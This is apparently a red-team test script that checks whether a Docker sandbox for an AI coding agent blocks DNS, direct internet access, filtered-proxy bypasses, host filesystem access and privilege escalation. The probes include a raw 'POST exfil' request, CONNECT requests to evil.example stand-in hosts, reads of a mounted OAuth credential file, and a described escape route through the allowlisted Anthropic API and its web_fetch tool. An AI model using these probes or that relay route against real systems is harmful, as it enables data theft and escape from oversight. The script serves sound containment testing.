#!/usr/bin/env node
// C6 executor-sandbox RED-TEAM suite (C6-P6 — the acceptance gate).
//
//   node scripts/redteam/c6-redteam.mjs            # boundary probes only (FREE, no API tokens)
//   node scripts/redteam/c6-redteam.mjs --with-api # ALSO run the credential-relay probe (COSTS
//                                                   # a few hundred Anthropic tokens on David's Max
//                                                   # subscription — off by default).
//
// NOT part of `npm test`. It drives real Docker containers (slow) and, with --with-api, spends
// real tokens. Re-run it after ANY change to the sandbox (image, network, proxy, adapter) to
// re-verify containment. Each probe bypasses Claude and the permission layer entirely — it runs
// raw commands in the container — so a green here means the CONTAINER/NETWORK boundary held, not
// that a tool happened to be un-allowlisted. See docs/operator/c6-redteam-results.md for the
// written findings + verdict.
//
// Classifications printed per case:
//   CONTAINED  — the OS/container/network boundary blocked it (real containment)
//   NOT-CONTAINED — the boundary did NOT block it (a real hole)
//   INFO       — observation, not a pass/fail (e.g. "credential is readable", which it MUST be)

import { spawnSync } from 'child_process'
import { homedir } from 'os'
import { join, dirname } from 'path'
import { fileURLToPath } from 'url'
import {
  EXECUTOR_NET, EXECUTOR_PROXY_CONTAINER,
} from '../lib/claude-executor-adapter.mjs'

const HERE = dirname(fileURLToPath(import.meta.url))

const DOCKER = process.env.DOCKER_BIN || 'docker'
const IMAGE = process.env.EXECUTOR_IMAGE || 'mc-executor:latest'
const CREDS = join(homedir(), '.claude', '.credentials.json')
const WITH_API = process.argv.includes('--with-api')

// Same hardening flags the dispatcher ships (buildDockerArgs): cap-drop, no-new-privileges,
// the --internal network. We deliberately do NOT inject HTTPS_PROXY — connecting to the proxy
// by hostname directly is a strictly more conservative test of the boundary.
const HARDEN = ['--cap-drop=ALL', '--security-opt=no-new-privileges', '--network', EXECUTOR_NET]

function runInSandbox({ mountCreds = false, node, sh, mountFile }, timeoutMs = 90000) {
  const args = ['run', '--rm', ...HARDEN]
  if (mountCreds) args.push('-v', `${CREDS}:/home/builder/.claude/.credentials.json:ro`)
  if (mountFile) args.push('-v', `${mountFile}:/tmp/probe.mjs:ro`)
  args.push(IMAGE)
  if (mountFile) args.push('node', '/tmp/probe.mjs')
  else if (node) args.push('node', '-e', node)
  else args.push('sh', '-c', sh)
  const r = spawnSync(DOCKER, args, {
    encoding: 'utf8', timeout: timeoutMs, maxBuffer: 8 * 1024 * 1024,
    env: { ...process.env, MSYS_NO_PATHCONV: '1' },
  })
  return `${r.stdout || ''}${r.stderr ? '\n[stderr] ' + r.stderr : ''}`.trim()
}

const results = []
const record = (n, cls, detail) => { results.push({ n, cls, detail }); console.log(`\n[${cls}] ${n}\n${detail}`) }

// --- 1. DNS is dead on the internal network ---------------------------------
{
  const out = runInSandbox({ node: `
const dns=require('dns');const t=n=>new Promise(r=>dns.resolve4(n,(e,a)=>r(n+' -> '+(e?e.code:JSON.stringify(a)))));
(async()=>{for(const n of ['example.com','api.anthropic.com','8.8.8.8.in-addr.arpa'])console.log(await t(n))})();` })
  const contained = /ESERVFAIL|ENOTFOUND|EAI_AGAIN/.test(out) && !/\["/.test(out)
  record('DNS resolution off the --internal network', contained ? 'CONTAINED' : 'NOT-CONTAINED', out)
}

// --- 2. Direct TCP egress bypassing the proxy -------------------------------
{
  const out = runInSandbox({ node: `
const net=require('net');const t=(h,p)=>new Promise(r=>{const c=net.connect({host:h,port:p});c.setTimeout(6000);
c.on('connect',()=>{r(h+':'+p+' CONNECTED');c.destroy()});c.on('timeout',()=>{r(h+':'+p+' TIMEOUT');c.destroy()});
c.on('error',e=>r(h+':'+p+' '+e.code))});
(async()=>{for(const[h,p]of[['1.1.1.1',443],['8.8.8.8',53],['93.184.215.14',443]])console.log(await t(h,p))})();` })
  const contained = !/CONNECTED/.test(out)
  record('Direct TCP to the internet (proxy-bypass)', contained ? 'CONTAINED' : 'NOT-CONTAINED', out)
}

// --- 3. Proxy filtering: blocked hosts, ports, verbs, spoofs ----------------
{
  const out = runInSandbox({ node: `
const net=require('net');
const raw=(l,p)=>new Promise(r=>{const c=net.connect({host:'${EXECUTOR_PROXY_CONTAINER}',port:8888});let b='';c.setTimeout(9000);
c.on('connect',()=>c.write(p));c.on('data',d=>{b+=d;if(b.length>120)c.destroy()});c.on('timeout',()=>c.destroy());
c.on('close',()=>r(l+' => '+(b.split('\\r\\n')[0]||'(no response)')));c.on('error',e=>r(l+' => ERR '+e.code))});
(async()=>{for(const[l,p]of[
['blocked host example.com:443','CONNECT example.com:443 HTTP/1.1\\r\\nHost: example.com:443\\r\\n\\r\\n'],
['allowed api.anthropic.com:443','CONNECT api.anthropic.com:443 HTTP/1.1\\r\\nHost: api.anthropic.com:443\\r\\n\\r\\n'],
['non-443 port api.anthropic.com:22','CONNECT api.anthropic.com:22 HTTP/1.1\\r\\nHost: api.anthropic.com:22\\r\\n\\r\\n'],
['raw IP 1.1.1.1:443','CONNECT 1.1.1.1:443 HTTP/1.1\\r\\nHost: 1.1.1.1:443\\r\\n\\r\\n'],
['suffix trick api.anthropic.com.evil.example','CONNECT api.anthropic.com.evil.example:443 HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n'],
['host-hdr spoof (CONNECT evil, Host anthropic)','CONNECT evil.example:443 HTTP/1.1\\r\\nHost: api.anthropic.com\\r\\n\\r\\n'],
['plain GET http://example.com/','GET http://example.com/ HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'],
['POST exfil http://example.com/collect','POST http://example.com/collect HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 3\\r\\n\\r\\nAAA'],
])console.log(await raw(l,p))})();` })
  // Every blocked case must 403; the two allowed cases (200) are expected.
  const blockedOk = (out.match(/403/g) || []).length >= 6
  const allowedOk = /allowed api\.anthropic\.com:443 => HTTP\/1\.1 200/.test(out)
  record('Proxy filtering (blocked hosts/ports/verbs/spoofs => 403)',
    blockedOk && allowedOk ? 'CONTAINED' : 'NOT-CONTAINED', out)
}

// --- 4. Filesystem: no host files, workspace-only, no docker socket ---------
{
  const out = runInSandbox({ node: `
const fs=require('fs');const c=p=>{try{const s=fs.statSync(p);return p+' -> '+(s.isDirectory()?'DIR':'FILE')}catch(e){return p+' -> '+e.code}};
for(const p of['/c','/mnt/c','/host','/var/run/docker.sock','/c/Users/david/.env.local','/root/.claude.json'])console.log(c(p));
let esc=false;try{fs.writeFileSync('/etc/redteam','x');esc=true}catch(e){console.log('/etc write -> '+e.code)}
console.log('ESCAPE_WRITE_OUTSIDE_WORKSPACE='+esc);` })
  const contained = !/docker\.sock -> (DIR|FILE)/.test(out)
    && !/\.env\.local -> (DIR|FILE)/.test(out)
    && /ESCAPE_WRITE_OUTSIDE_WORKSPACE=false/.test(out)
  record('Filesystem isolation (no host mounts, no docker socket, RO rootfs)',
    contained ? 'CONTAINED' : 'NOT-CONTAINED', out)
}

// --- 5. Privilege: caps dropped, no-new-privs ------------------------------
{
  const out = runInSandbox({ sh: `id; grep -E '^(CapEff|NoNewPrivs)' /proc/self/status` })
  const contained = /CapEff:\s*0000000000000000/.test(out) && /NoNewPrivs:\s*1/.test(out)
  record('Privilege drop (CapEff=0, NoNewPrivs=1)', contained ? 'CONTAINED' : 'NOT-CONTAINED', out)
}

// --- INFO. The mounted credential IS readable (it must be, to authenticate) --
{
  const out = runInSandbox({ mountCreds: true, node: `
const fs=require('fs');try{const j=JSON.parse(fs.readFileSync('/home/builder/.claude/.credentials.json','utf8'));
console.log('credential readable by build: YES; keys='+Object.keys(j.claudeAiOauth||{}).join(','))}catch(e){console.log('cred '+e.code)}` })
  record('Mounted Claude credential readability (expected YES — auth needs it)', 'INFO', out)
}

// --- 6. THE HOLE: allowlisted api.anthropic.com is a general egress relay ----
//     Uses the mounted OAuth token (which the build can read) to (a) make an
//     arbitrary model call and (b) drive the server-side web_fetch tool, whose
//     URL is attacker-chosen — exfil straight past the egress allowlist.
if (WITH_API) {
  const out = runInSandbox({ mountCreds: true, mountFile: join(HERE, 'probes', 'api-relay.mjs') }, 120000)
  // Honest classification: only the probe's own RELAY-RESULT line decides. A crash
  // (PROBE-ERROR / RELAY-RESULT: ERROR / no RELAY-RESULT at all) is NEVER a pass —
  // that is the exact false-green trap this suite exists to avoid.
  const m = out.match(/^RELAY-RESULT:\s*(\S+)/m)
  const cls = !m ? 'NOT-CONTAINED (probe produced no verdict — treat as unproven, investigate)'
    : m[1] === 'CONTAINED' ? 'CONTAINED'
    : m[1] === 'NOT-CONTAINED' ? 'NOT-CONTAINED'
    : 'NOT-CONTAINED (probe errored — unproven)'
  record('Allowlisted api.anthropic.com as egress relay (mounted token + web_fetch)',
    cls.startsWith('CONTAINED') ? 'CONTAINED' : 'NOT-CONTAINED', `${out}\n(classified: ${cls})`)
} else {
  record('Allowlisted api.anthropic.com as egress relay (mounted token + web_fetch)',
    'SKIPPED', 'run with --with-api to execute (spends Anthropic tokens). Closed by the TLS-terminating proxy (Case 7) — this probe now certifies web_fetch/web_search/files/profile are all blocked.')
}

// --- summary ----------------------------------------------------------------
console.log('\n' + '='.repeat(70))
console.log('C6 RED-TEAM SUMMARY')
for (const r of results) console.log(`  ${r.cls.padEnd(14)} ${r.n}`)
const holes = results.filter(r => r.cls === 'NOT-CONTAINED')
console.log('='.repeat(70))
console.log(holes.length ? `VERDICT: ${holes.length} NOT-CONTAINED finding(s) — sandbox is NOT complete.`
  : `VERDICT: no NOT-CONTAINED findings in the probes that ran.`)
process.exit(holes.length ? 1 : 0)
